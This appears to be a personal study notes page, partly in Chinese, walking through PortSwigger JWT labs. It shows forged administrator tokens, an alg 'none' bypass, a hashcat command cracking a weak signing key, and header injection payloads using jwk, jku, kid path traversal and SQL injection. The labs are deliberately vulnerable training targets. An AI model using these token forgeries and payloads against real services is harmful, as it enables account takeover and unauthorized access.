---
title: JWT
description: JWT
---

<!-- ## 前言

建議先讀過 [Web Tech JWT](../web-tech/jwt.md) -->

## Lab: JWT authentication bypass via unverified signature

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#accepting-arbitrary-signatures                         |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature |

NodeJS 的 [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) 就有提供

### decode

```js
/**
 * Returns the decoded payload without verifying if the signature is valid.
 * token - JWT string to decode
 * [options] - Options for decoding
 * returns - The decoded Token
 */
export function decode(token: string, options: DecodeOptions & { complete: true }): null | Jwt;
```

### verify

```js
/**
 * Synchronously verify given token using a secret or a public key to get a decoded token
 * token - JWT string to verify
 * secretOrPublicKey - Either the secret for HMAC algorithms, or the PEM encoded public key for RSA and ECDSA.
 * [options] - Options for the verification
 * returns - The decoded token.
 */
export function verify(
    token: string,
    secretOrPublicKey: Secret | PublicKey,
    options: VerifyOptions & { complete: true },
): Jwt;
```

如果使用 [decode](#decode) 的話，就會有資安漏洞

這題的 JWT 解出來是

```json
// header
{
  "kid": "c40a9f76-6b83-4785-87dd-a6ba744a376d",
  "alg": "RS256"
}
// payload
{
  "iss": "portswigger",
  "exp": 1761457542,
  "sub": "wiener"
}
```

把 payload 重新包裝

```js
btoa(`{"iss":"portswigger","exp":1761457542,"sub":"administrator"}`);
```

塞回 cookie 就可以成功通關～

## Lab: JWT authentication bypass via flawed signature verification

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#accepting-tokens-with-no-signature                              |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification |

構造

```js
btoa(`{"kid":"4ae5b5dd-6fa4-4f30-a7eb-2f1cf9f77049","alg":"none"}`);
btoa(`{"iss":"portswigger","exp":1761480707,"sub":"administrator"}`);
```

然後拼起來，塞回 cookie，就可以成功通關

## Brute-forcing secret keys using hashcat

https://portswigger.net/web-security/jwt#brute-forcing-secret-keys-using-hashcat

語法

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

- https://hashcat.net/hashcat/
- https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

## Lab: JWT authentication bypass via weak signing key

| Dimension | Description                                                                                 |
| --------- | ------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#brute-forcing-secret-keys-using-hashcat            |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key |

執行

```
hashcat -a 0 -m 16500 eyJraWQiOiIzZDNkYjJkZS0wOTIxLTQ2ODctOTlmYi01NTlkNjA4MzYzNGEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4MTM0Miwic3ViIjoid2llbmVyIn0.FsQAxYSBT5whQS5blEAuXMu3-z3T97LGBULToAbUz4A "C:\path\to\jwt.secrets.list"
```

結果馬上就找到

```
eyJraWQiOiIzZDNkYjJkZS0wOTIxLTQ2ODctOTlmYi01NTlkNjA4MzYzNGEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4MTM0Miwic3ViIjoid2llbmVyIn0.FsQAxYSBT5whQS5blEAuXMu3-z3T97LGBULToAbUz4A:secret1
```

用 NodeJS 的 jsonwebtoken 來簽

```js
const token10 = sign(
  { iss: "portswigger", exp: 1761482635, sub: "administrator" },
  "secret1",
  {
    noTimestamp: true,
    keyid: "9c1bd791-418f-46d0-9a5d-e1af3f3da139",
    header: {
      alg: "HS256",
      typ: undefined,
    },
  },
);
console.log(token10);
// eyJhbGciOiJIUzI1NiIsImtpZCI6IjljMWJkNzkxLTQxOGYtNDZkMC05YTVkLWUxYWYzZjNkYTEzOSJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4MjYzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.B_3-zDREkzRs_YXGs5_5YUjpqbE_Bo9XnusXoB8bxBU
console.log(decode(token10, { complete: true }));
// {
//   header: { alg: 'HS256', kid: '9c1bd791-418f-46d0-9a5d-e1af3f3da139' },
//   payload: { iss: 'portswigger', exp: 1761482635, sub: 'administrator' },
//   signature: 'B_3-zDREkzRs_YXGs5_5YUjpqbE_Bo9XnusXoB8bxBU'
// }
```

token 塞回 cookie，結束這回合

## JWT header parameter injections

https://portswigger.net/web-security/jwt#jwt-header-parameter-injections

- jwk (JSON Web Key)
- jku (JSON Web Key Set URL)
- kid (Key ID)

## Injecting self-signed JWTs via the jwk parameter

https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter

example jwt header

```json
{
  "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
  }
}
```

jwk 要怎麼生成?

- Burp Suite JWT Editor extension
- https://www.npmjs.com/package/jose

## Injecting self-signed JWTs via the jku parameter

https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter

/.well-known/jwks.json

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
      "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
    },
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
      "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
    }
  ]
}
```

## Injecting self-signed JWTs via the kid parameter

https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter

- Path traversal

```json
{
  "kid": "/dev/null", // empty string
  "typ": "JWT",
  "alg": "HS256",
  "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

- SQLi

```json
{
  "kid": "' UNION SELECT 'hello'",
  "typ": "JWT",
  "alg": "HS256",
  "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

## 參考資料

- https://portswigger.net/web-security/jwt
